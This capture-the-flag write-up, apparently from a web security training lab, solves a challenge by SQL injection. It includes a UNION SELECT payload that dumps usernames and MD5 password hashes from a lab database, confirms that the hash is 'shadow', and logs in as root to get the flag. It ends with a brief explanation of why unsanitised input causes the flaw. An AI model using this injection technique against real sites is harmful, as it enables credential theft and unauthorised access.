# <span style="text-decoration: underline"> DB_DEFAULT </span>

##### Tags : `SQL Injection`
##### Server ip : `192.168.1.23 `
____

# <span style="text-decoration: underline">problem</span>

From the [member](/member.md) challenge we have found that there is a table called `db_default` of the database `Member_Brute_Force` that contains the following columns

- id
- username
- password

Let's try to see if we can findout anything interesting in that database!

# <span style="text-decoration: underline">Solution</span>

## Extract more contents from the table `db_default`

During the [member](/member.md) challenge we have found out what `table` contains what `column` name

|No|Table|Column names|
|--|--|--|
|1| **db_default** | `id`, `username`, `password` |
|2| **users** | `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`,  |
|3| **guestbook** | `id_comment` , `comment`, `name` |
|4| **list_images** | `id`, `url`, `title`, `comment` |
|5| **vote_dbs** | `id_vote`, `nb_vote`, `subject`|


Let's try to get the contents of this table

!> Remember that if we try to access a table that is not present in the default database but in some other database then we have to use the following syntax `database.table`


```sql
1 AND 1=2 UNION SELECT username, CONCAT(CHAR(124), id, CHAR(124), username, CHAR(124), password, CHAR(124)) AS name FROM Member_Brute_Force.db_default --
```

We get the following informations

|Id|Username|Password|
|--|--|--|
|1|root|3bf1114a986ba87ed28fc1b5884fc2f8|
|2|admin|3bf1114a986ba87ed28fc1b5884fc2f8|

We can see the that we have 2 users contining `md5` hash as their password. We allready know the password for the user **admin** thanks to the [brutforce](/brutforce.md) challenge which is `shadow`. We can easily verify that the `md5` hash of the word `shadow` is `3bf1114a986ba87ed28fc1b5884fc2f8` using the following command on **Linux** `echo -n "shadow" | md5sum` and and **MacOs**  `echo -n "shadow" | md5`

And we can see that the both user password hash is "3bf1114a986ba87ed28fc1b5884fc2f8" thus `shadow` being the password for both of them.

And when we try to login using the following credentials 
|username|password|
|--|--|
|root|shadow|

We get the flag `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`.

> This is the same flag as for the `brutforce` challenge where we logged is as the user **admin** using the password `shadow`

# How to avoid the problem

Sql injection could be a dengerouis problem which could as fas as compromise the whole system. in our situation the programmer used the raw **user input** data inside the query which in turn let the user control what the quert string becomes and so the result is given. This kind of situation can be avoided easily by not using the user input directly in our string.


# Flag

```text
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```
